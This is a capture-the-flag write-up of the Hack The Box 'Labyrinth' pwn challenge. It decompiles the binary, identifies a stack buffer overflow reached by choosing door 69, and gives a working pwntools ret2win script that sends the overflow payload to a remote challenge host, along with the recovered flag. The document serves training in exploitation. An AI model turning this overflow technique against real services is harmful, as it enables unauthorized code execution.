# Hack The Box — Pwn Challenge: Labyrinth Writeup

**Author:** 0xdf-sec  
**Date:** 2025-07-29 00:31:23 UTC


## Initial Analysis

Looking at our challenge files, we have:
- `labyrinth` - the binary file we need to exploit
- `glibc` - collection of standard libraries required by the binary
- `flag.txt` - fake flag for local testing

Let's check the binary security protections using `checksec`:

```bash
checksec ./labyrinth
```

**Security Analysis:**
- **Full RELRO**: GOT is read-only, preventing GOT overwrite attacks
- **No Canary**: Stack buffer overflow protection is disabled
- **NX Enabled**: Stack/heap are non-executable, preventing shellcode execution
- **No PIE**: Binary loads at fixed addresses, making exploitation easier

## Runtime Analysis

Starting the docker environment and connecting via netcat:

```bash
nc <ip> <port>
```

The program presents us with a "labyrinth" interface showing doors numbered 001-100. Choosing a random door results in failure, so we need to reverse engineer the binary to find the correct path.

## Reverse Engineering with Ghidra

Loading the binary into Ghidra and analyzing the `main` function reveals the key logic:

```c
undefined8 main(void)
{
  int iVar1;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  char *local_18;
  ulong local_10;
  
  setup();
  banner();
  
  // Initialize local variables
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  
  // Display doors 1-100
  fwrite("\nSelect door: \n\n",1,0x10,stdout);
  for (local_10 = 1; local_10 < 0x65; local_10 = local_10 + 1) {
    // Door display logic...
  }
  
  // Get user input
  local_18 = (char *)malloc(0x10);
  fgets(local_18,5,stdin);
  
  // Check for door "69" or "069"
  iVar1 = strncmp(local_18,"69",2);
  if (iVar1 != 0) {
    iVar1 = strncmp(local_18,"069",3);
    if (iVar1 != 0) goto LAB_004015da;
  }
  
  // Vulnerable input - buffer overflow opportunity!
  fwrite("\nYou are heading to open the door but you suddenly see something on the wall:\n\n\"Fly like a bird and be free!\"\n\nWould you like to change the door you chose?\n\n>> ", 1, 0xa0, stdout);
  fgets((char *)&local_38,0x44,stdin);  // 68 bytes into 32-byte buffer!
  
LAB_004015da:
  fprintf(stdout,"\n%s[-] YOU FAILED TO ESCAPE!\n\n",&DAT_00402541);
  return 0;
}
```

**Key Findings:**
1. Door "69" or "069" triggers the vulnerable code path
2. The second `fgets` reads 68 bytes (`0x44`) into a 32-byte buffer (`local_38`)
3. This creates a classic stack buffer overflow vulnerability

## Finding the Target Function

Analyzing further, we discover the `escape_plan` function that reads and prints the flag:

```c
void escape_plan(void)
{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  putchar(10);
  fwrite(&DAT_00402018,1,0x1f0,stdout);
  fprintf(stdout, "\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey : %s\n", &DAT_0040220e,&DAT_00402209);
  
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n\n");
    exit(1);
  }
  
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  return;
}
```

Getting the function address:
```bash
objdump -d ./labyrinth | grep escape
```

## Exploitation

The vulnerability allows us to overflow the stack and overwrite the return address to redirect execution to `escape_plan`.

**Exploit Script:**
```python
from pwn import *

exe = ELF("/path/to/labyrinth")
libc = ELF("/path/to/libc.so.6")
ld = ELF("/path/to/ld-linux-x86-64.so.2")

context.binary = exe

host = '94.237.52.170'
port = 56514
r = remote(host, port)

# Step 1: Enter door 69 to reach vulnerable code path
r.sendline(b'69')

# Step 2: Craft buffer overflow payload
addr = 0x0000000000401256  # Address of escape_plan function
payload = b'a' * 0x30 + p64(exe.bss() + 0x200) + p64(addr)

# Payload breakdown:
# b'a' * 0x30: 48 bytes to fill buffer and reach return address
# p64(exe.bss() + 0x200): Fake base pointer
# p64(addr): Overwrite return address with escape_plan

r.sendline(payload)

# Receive and display flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')
```

## Execution

Running the exploit:
```bash
python3 exploit.py
```

**Result:** `HTB{3sc4p3_fr0m_4b0v3}`

## Summary

This challenge demonstrates a classic stack buffer overflow vulnerability where:
1. Door "69" unlocks the vulnerable code path
2. Insufficient bounds checking allows stack overflow
3. Return address overwrite redirects execution to the flag-printing function

**Key Skills Required:**
- Binary analysis with Ghidra
- Understanding stack frame layout
- Buffer overflow exploitation techniques
- Python scripting with pwntools

The challenge serves as an excellent introduction to stack-based buffer overflows in a controlled CTF environment.

---
*Challenge completed successfully! On to the next pwn challenge! 💻*
